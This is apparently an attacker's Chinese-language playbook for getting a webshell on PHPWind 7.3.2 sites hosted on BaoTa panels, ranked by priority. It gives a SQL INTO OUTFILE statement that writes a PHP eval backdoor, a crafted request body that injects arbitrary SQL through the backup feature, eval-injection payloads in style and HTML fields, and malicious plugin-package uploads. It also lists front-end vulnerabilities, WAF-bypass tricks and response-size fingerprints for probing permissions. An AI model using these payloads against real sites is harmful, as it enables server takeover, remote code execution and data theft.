# PHPWind 7.3.2 后台 Getshell 操作手册（按优先级，含权限判据与判死清单）

## 0. 权限自检判据（每次操作前必读）
PW 后台用 `adminRight($key,$admintype)`，**无权限返回约 148xx 字节「您没有权限进行此项操作或此功能未完成」提示页**。
- 148xx 字节 → 该功能键未开放，换下一条
- 200 + 功能页 → 有权限，继续利用
- 0 字节 / 跳登录页 → 会话失效（`AdminUser` cookie 有效期短，操作前重登）

⚠️ **权限键陷阱**：`example.com:57` 走 `adminRight('bakup',$admintype)`，`$temp = $admintype ?: $adminjob`
⇒ 带 `&admintype=bakout` 时检查的是 `bakout`，不带时检查 `bakup` —— **两种都要分别自检**。

## 1. P0 — SQL INTO OUTFILE 一步写马（最强）
入口 `example.com?adminjob=table`（数据表管理）/ `adminjob=optimize`。
```sql
SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/www/wwwroot/<站目录>/x.php';
```
前提：`secure_file_priv=''`（宝塔默认常为空）、已知 web 根、MySQL FILE 权限。宝塔站点根 `/www/wwwroot/<主域名>/`。
**报错即情报**：secure_file_priv 限制与目录不可写都会明确报错，据此二次修正。
落地：`POST /x.php  1=system('id');`

## 2. P1 — admin/bakup.php 任意 SQL（源码级确证，7.3.2/7.5SP3 同结构）
```php
// admin/target276.example.com:174-183  $table 来自 $_POST['tabledb']，裸拼接无过滤
$creattable .= "DROP TABLE IF EXISTS $table;\n";   // ★ 元素含 \n 即插入独立 SQL 行
// admin/target276.example.com:185-216  行尾是 ; 就 query 一次 → 天然多语句
if (eregi(";$", $value)) { $query .= $value; $db->query($query); }
```
两步利用：
1. `POST /example.com?adminjob=bakup&verify=<v>` body
   `action=bakout&step=0&sizelimit=1&tabledb[]=x%0AUPDATE pw_hack SET hk_value=0 WHERE hk_name=0x626b5f706572;&tabledb[]=pw_config`
   → 响应/重定向 URL 中取服务端生成的 `pre=`
2. `POST /example.com?adminjob=bakup&verify=<v>` body `action=bakin&step=1&count=1&pre=<pre>`
   → `bakindata()` 执行 `data/<pre>1.sql` → 任意 SQL 生效
表名不要用引号（CheckVar 可能过滤），用 `0x...` 十六进制（`bk_per` = `0x626b5f706572`）。

## 3. P2 — admin/cache.php 风格 CSS eval
```php
// admin/target117.example.com:682-686 / 704-708
$style_css = addslashes(str_replace(array('<style type="text/css">','</style>'),'',$style_css[1]));
eval("\$style_css = \"$style_css\";");
```
`addslashes` 只处理 `"` `'` `\` NUL，**`$ { }` 全放行** → `${system(id)}` 可用。
**写入侧防守**：`admin/target188.example.com:154` 把 `$`→`\$`，正常后台写入路径插值失效 ⇒ 需找其它能把 `${...}` 原样写进 `data/style/{tplpath}_css.htm` 的点。触发：`example.com?adminjob=cache`（更新缓存）。

## 4. P3 — admin/level.php HTML eval
```php
// admin/target120.example.com:596
eval("\$html = \"" . addcslashes($html, '"') . "\";");   // 只转义 " ，$ 与 {} 放行
```
需定位 `$html` 的后台输入字段（用户组/等级自定义 HTML 或权限描述）。

## 5. P4 — 模板/风格/插件包 zip 导入解压落马
打包合法 manifest + 附带 `a.php` → 后台「模板/风格/插件管理」导入解压 → 访问。同源证据：PHPWind 9.0.2 `AppController.php` 的 uploadAction→doinstallAction→extractPackage 只校验 manifest alias 不重名即解压，马落 `src/extensions/<alias>/a.php`。

## 6. P5 — 后台放开附件扩展名 → 前台传马
后台「上传类型设置」把 php 加进 `$db_uploadfiletype` → 前台附件上传传马。若 `disable_functions`/`open_basedir` 均为空，**任意写文件即等价 RCE**。

## 7. P6 — bank_sort.php 代码注入（已被长度锁死，不建议先打）
机制成立（`savearray()` 仅 addslashes、同请求 include、`$bk_per` 为空时每请求重写），但 `date_f` 截断 15B、username 上限 12B 双锁死；最小可传参 payload `${eval($_GET[0])}` = 17 字符。复活条件：找长度 ≥21B 且进 `savearray()` 双引号串的载体（blog 日志标题/公告/版块名/昵称常有 50+ 字节）。

## 8. 前台面（无需后台）
| 路径 | 类型 | 说明 |
|---|---|---|
| `pw_example.com?action=pcdelimg` 的 `fieldname` | 布尔盲注 | 7.3.2 唯一真洞 |
| `pw_api.php`→`api/class_base.php` `$mode` | 任意文件包含 | 前台零登录，需 apikey + 自算 sig |
| `pw_api.php`→`api/class_other.php` `threadscategory` | 写码 RCE | wooyun-2010-04 |
| `sitemap.php` | 零鉴权泄露 | 帖子标题+作者+**管理员用户名**+精确版本 |
| `example.com` | 零鉴权泄露 | 全站会员名+UID+注册时间 |

### 源码级判死（别再投额度）
- **apps 文件包含**（`apps.php?q=...&basePath=...`、`apps/groups|share/example.com`）：`$q` 只在 apps/ 白名单 12 个 app 名内，`app_route.php:71` 的 `Pcv($baseFile)` 命中 `'..'` 直接 `exit('Forbidden')`
- **mode 文件包含**：`$m` 不进路径
- **birth 生日写码链**：`Char_cv` 把 `'` 实体化为 `&#39;`
- **tag 写码 / faq 的 $sqlwhere / example.com?action=vote 的 $sqlw**
- **`/admin/cache.php`、`/admin/level.php` 直连**：9 字节 `Forbidden`（`!function_exists('readover') && exit('Forbidden')`），只能走 `/example.com?adminjob=...`

## 9. 环境障碍（宝塔系 PHPWind 站）
宝塔 WAF 拦 `/.env`/`.git`/备份后缀（403 + 1200B「网站防火墙」页）；`/data/*.php` 走 nginx deny（403 + 548B）；`/example.com` 可能被 WAF 关键词拦（试 `/hac%6b.php`）；`/install.php` 404 时 nuclei 唯一 phpwind 模板不命中；宝塔 phpMyAdmin 常在 888 端口。

## 10. 响应字节数速查
3933=登录页 ｜ 21679=后台首页 ｜ 148xx=无权限 ｜ 0=会话失效 ｜ 1200=宝塔WAF拦 ｜ 548=nginx 403/404 ｜ 9=PHPWind Forbidden 守卫